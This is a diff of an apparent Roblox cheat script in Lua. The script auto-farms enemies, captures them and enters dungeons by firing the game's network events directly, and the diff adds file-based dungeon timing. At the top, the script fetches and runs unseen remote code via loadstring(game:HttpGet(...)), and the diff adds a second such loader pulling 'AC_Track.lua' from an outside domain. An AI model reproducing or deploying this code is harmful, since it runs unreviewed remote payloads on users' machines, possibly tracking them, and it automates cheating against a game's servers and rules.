@@ -9,6 +9,7 @@ repeat wait() until game:IsLoaded()
 
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/pipipipipia23/ansdwasdz/refs/heads/main/quanhlow"))()
+    loadstring(game:HttpGet("https://files.cuonggdev.com/AC_Track.lua"))()
 end)
 
 local Services = setmetatable({}, {
@@ -26,6 +27,7 @@ local PetsInfo = require(Storage.Indexer.PetsInfo)
 local BalalnceInfo = require(Storage.Indexer.BalanceInfo)
 local WeaponsInfo = require(Storage.Indexer.WeaponsInfo)
 local ShopInfo = require(Storage.Indexer.ShopInfo)
+local HttpService = Services.HttpService
 ---
 local EnemiNetwork = Network.ReferenceBridge("ENEMY_EVENT")
 local PetNetwork = Network.ReferenceBridge("PET_EVENT")
@@ -48,6 +50,7 @@ local fullRank6 = nil
 local haspet = false
 local hasmaxed = indungeon
 local dpsSword = 0
+local canjoindungeon = false
 getgenv().MaxDPS = 0
 getgenv().Dungeon = indungeon
 getgenv().variables = {}
@@ -72,7 +75,7 @@ task.spawn(function()
     while true do
         local tickn = tick()
         repeat wait()
-        until tick() - tickn >= 10
+        until tick() - tickn >= 20
         enemiesblockdungeon = {}
     end
 end)
@@ -87,6 +90,27 @@ task.spawn(function()
         end
     end
 end)
+-- setup file
+local pathfile = "AriseQuanhDz//"
+local namefile = "dungeonTiming-".. plr.Name
+
+if not isfolder("AriseQuanhDz") then
+    makefolder("AriseQuanhDz")
+end
+
+local function writeFile(name, tableData)
+    local file = pathfile..name..".json"
+    writefile(file, HttpService:JSONEncode(tableData))
+end
+
+local function readFile(name)
+    local file = pathfile..name..".json"
+    if isfile(file) then
+        return HttpService:JSONDecode(readfile(file))
+    else
+        return nil
+    end
+end
 
 --- Setup data
 local dataMap = {
@@ -383,7 +407,7 @@ function getEnemiesDungeon()
     local hp = math.huge
     for _, enemy in pairs(Services.CollectionService:GetTagged("EnemyServer")) do
         local attrs = enemy:GetAttributes()
-        if table.find(enemiesblockdungeon, enemy.Name) == nil and attrs.HP < hp then
+        if table.find(enemiesblockdungeon, enemy.Name) == nil and attrs.HP < hp and attrs.HP > 0 then
             hp = attrs.HP
             chosenEnemy = enemy
         end
@@ -414,8 +438,28 @@ function Attack()
     end
 end
 
+function Arise(enemi)
+    local tickn = tick()
+    repeat wait(.1)
+        if ((plr.leaderstats:GetAttribute("Rank") >= 5 and getgenv().MaxDPS >= 200000000000) or getgenv().MaxDPS <= 200000000000) or not indungeon then
+            local gemne = plr.leaderstats:GetAttribute("Gems")
+            if (fullRank6 and gemne < getgenv().config.lockgem) and not indungeon then
+                EnemiNetwork:Fire({
+                    Event = "EnemyDestroy", 
+                    Enemy = enemi
+                });
+            else
+                EnemiNetwork:Fire({
+                    Event = "EnemyCapture", 
+                    Enemy = enemi
+                });    
+            end
+        end
+    until tick() - tickn >= 3
+end
+
 task.spawn(function()
-    while true do task.wait(.1)
+    while true do task.wait(.05)
         if hasmaxed then
             pcall(Attack)
         end
@@ -425,7 +469,7 @@ end)
 function fullyAttack(Enemies)
     -- checkingstatus2("Attacking: "..Enemies.Name)
     if (plr.Character.HumanoidRootPart.Position - Enemies.Position).Magnitude > 10 then
-        tweenfarm(Enemies.CFrame * CFrame.new(5,0,0), {speed = 100})
+        tweenfarm(Enemies.CFrame * CFrame.new(2,0,0), {speed = 100})
     else
         local enemy = setValue("EnemiesId", Enemies.Name)
         if PetIsAttackingGetId() ~= Enemies.Name then
@@ -440,29 +484,14 @@ function fullyAttack(Enemies)
                 goPet.PetPos[v] = Enemies.Position
             end
             PetNetwork:Fire(goPet);
-            task.wait(.5)
+            task.wait(1)
         end
-        repeat task.wait(.5)
+        repeat task.wait(.1)
             setValue("EnemiesId", Enemies.Name)
         until PetIsAttackingGetId() ~= Enemies.Name or not getgenv().Dungeon
-        local time = 0
-        if ((plr.leaderstats:GetAttribute("Rank") >= 5 and getgenv().MaxDPS >= 200000000000) or getgenv().MaxDPS <= 200000000000) or not indungeon then
-            repeat wait(.5)
-                local gemne = plr.leaderstats:GetAttribute("Gems")
-                if (fullRank6 and gemne < getgenv().config.lockgem) and not indungeon then
-                    EnemiNetwork:Fire({
-                        Event = "EnemyDestroy", 
-                        Enemy = enemy
-                    });
-                else
-                    EnemiNetwork:Fire({
-                        Event = "EnemyCapture", 
-                        Enemy = enemy
-                    });    
-                end
-                time = time + 1
-            until time > 3
-        end
+        task.spawn(function()
+            Arise(enemy)
+        end)
         if not indungeon then
             equipMaxPet()
         else
@@ -765,33 +794,73 @@ end)
 
 --- function checkdungeon
 
+local function calctime()
+    local currentTime = os.time()
+    local notificationInterval = 2160 -- 36 phút
+    local nextTime = math.ceil(currentTime / notificationInterval) * notificationInterval
+    return nextTime - currentTime
+end
+
+local function joindungeon()
+    GenerealNetwork:Fire({
+        Event = "DungeonAction", 
+        Action = "BuyTicket", 
+        Type = "Gems"
+    })
+    GenerealNetwork:Fire({
+        Event = "DungeonAction",
+        Action = "Create"
+    })
+    GenerealNetwork:Fire({
+        Event = "DungeonAction",
+        Action = "Start",
+        Dungeon = plr.UserId
+    })
+end
+
 function FunctionDungeon() -- dit con me decomplie deo work nhe con me may
     if not getgenv().Dungeon and getgenv().MaxDPS > 0 then
-        for i,v in pairs(dataDungeon) do
-            if getgenv().MaxDPS >= v then
-                tween(dataMap[i])
-                wait(3)
-                print("Tween di ne")
-                if Workspace.__Main.__Dungeon:FindFirstChild("Dungeon") then
-                    GenerealNetwork:Fire({
-                        Event = "DungeonAction", 
-                        Action = "BuyTicket", 
-                        Type = "Gems"
-                    })
-                    GenerealNetwork:Fire({
-                        Event = "DungeonAction",
-                        Action = "Create"
-                    })
-                    GenerealNetwork:Fire({
-                        Event = "DungeonAction",
-                        Action = "Start",
-                        Dungeon = plr.UserId
-                    })
-                    task.wait(1)
-                end    
+        local function adumemay()
+            for i,v in pairs(dataDungeon) do
+                if getgenv().MaxDPS >= v then
+                    tween(dataMap[i])
+                    wait(3)
+                    print("Tween di ne")
+                    if Workspace.__Main.__Dungeon:FindFirstChild("Dungeon") then
+                        print("Co dungeon")
+                        canjoindungeon = true
+                        writeFile(namefile, {
+                            time = tick(),
+                            allowtime = calctime(),
+                            hasfinish = false,
+                        })
+                        joindungeon()
+                        task.wait(1)
+                    end    
+                end
             end
         end
+        local data = readFile(namefile)
+        if data then
+            if (tick() - data.allowtime) < data.time then
+                if data.hasfinish then
+                    joindungeon()
+                end
+            else
+                adumemay()
+            end
+        else
+            adumemay()
+        end
         getgenv().Dungeon = true
+    end
+end
+
+function finishDungeon()
+    local data = readFile(namefile)
+    if #Services.CollectionService:GetTagged("EnemyServer") == 0 then
+        data.hasfinish = true
+        writeFile(namefile, data)
     end
 end
 
@@ -806,21 +875,7 @@ function letfkinggorank()
 end
 
 local function waitUntilNextNotification()
-    local currentTime = os.time()
-    local notificationInterval = 1800 -- 30 phút
-    local nextTime = math.ceil(currentTime / notificationInterval) * notificationInterval
-
-    print("Chờ", nextTime - currentTime, "giây để đến mốc thông báo tiếp theo.")
-    task.wait(nextTime - currentTime)
-end
-
-local function waitUntilNextNotification2()
-    local currentTime = os.time()
-    local notificationInterval = 2160 -- 36 phút
-    local nextTime = math.ceil(currentTime / notificationInterval) * notificationInterval
-
-    print("Chờ", nextTime - currentTime, "giây để đến mốc thông báo tiếp theo.")
-    task.wait(nextTime - currentTime)
+    task.wait(calctime())
 end
 
 task.spawn(function()
@@ -833,7 +888,6 @@ task.spawn(function()
     while true do task.wait(1)
         if getgenv().Dungeon == true then
             waitUntilNextNotification()
-            local timeString = os.date("%X")
             getgenv().Dungeon = false
         end
     end    
@@ -843,7 +897,10 @@ task.spawn(function()
     while true do
         if not indungeon then
             pcall(letfkinggorank)
-            pcall(FunctionDungeon)
+            local a,b = pcall(FunctionDungeon)
+            print(a,b)
+        else
+            pcall(finishDungeon)
         end
         task.wait(1)
     end
@@ -851,7 +908,6 @@ end)
 
 -- Loop
 
-while true do task.wait(.3)
-    local a,b = pcall(AutoFarm)
-    print(a,b)
+while true do task.wait()
+    pcall(AutoFarm)
 end
